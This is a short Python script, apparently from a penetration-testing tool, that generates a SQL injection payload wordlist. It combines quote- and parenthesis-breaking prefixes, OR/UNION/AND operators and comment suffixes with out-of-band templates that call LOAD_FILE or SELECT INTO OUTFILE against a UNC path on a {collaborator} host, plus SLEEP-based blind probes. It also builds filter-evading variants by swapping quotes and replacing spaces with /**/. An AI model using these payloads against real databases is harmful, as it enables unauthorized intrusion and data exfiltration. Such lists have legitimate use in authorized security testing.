prefixes = [
    '',
    '; ',
    '" ',
    '") ',
    '")) ',
    '"))) ',
    ') ',
    ')) ',
    '))) '
]

sqlOperators = [
    '',
    'OR ',
    'UNION ',
    'AND '
]

suffixes = [
    '',
    ' -- ',
    '#',
    '/*'
    # ' ("',
    # ' (("',
    # ' ((("',
    # ' (',
    # ' ((',
    # ' ((('
]

templates = [
    'LOAD_FILE("\\\\\\\\{collaborator}\\a")',
    'SELECT "a" INTO OUTFILE "\\\\\\\\{collaborator}\\a"',
    'SELECT SLEEP({time})',
]

def generate():
    wordlist = []

    # injection via operators
    for prefix in prefixes:
        for sqlOperator in sqlOperators:
            for template in templates:
                for suffix in suffixes:
                    word = prefix + sqlOperator + template + suffix
                    wordlist.append(word)
                    wordlist.append(word.replace('"', '\''))
                    word = word.replace(' ', '/**/')
                    wordlist.append(word)
                    wordlist.append(word.replace('"', '\''))

    # injection via string concatination
    # TODO

    wordlist = list(set(wordlist))
    return wordlist
